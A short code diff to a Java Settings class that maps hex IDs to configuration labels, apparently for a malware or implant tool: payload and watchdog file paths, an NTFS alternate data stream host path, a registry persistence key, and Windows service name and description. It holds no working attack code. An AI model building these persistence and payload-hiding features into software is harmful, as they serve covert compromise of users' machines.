@@ -64,9 +64,11 @@ public class Settings implements Serializable{
     private void populateIdStringMap(){
         ID_STRING_MAP.put("0x2fc6b91a", "Watchdog Host File Path");
         ID_STRING_MAP.put("0x1117294c", "Payload Host File Path");
-        //ID_STRING_MAP.put("0x2226292c", "JVM Path");
-        ID_STRING_MAP.put("0x16231721", "Alternate Data Stream Host File Path");
-        ID_STRING_MAP.put("0x13251438", "Registry Persistence Key Name");
+        ID_STRING_MAP.put("0x2226292c", "JVM Path");
+        ID_STRING_MAP.put("0x1a621151", "Service Name");
+        ID_STRING_MAP.put("0x14541541", "Service Description");
+        ID_STRING_MAP.put("0x13251438", "Alternate Data Stream Host File Path");
+        ID_STRING_MAP.put("0x16231721", "Registry Persistence Key Name");
     } 
     
     //====================================================================
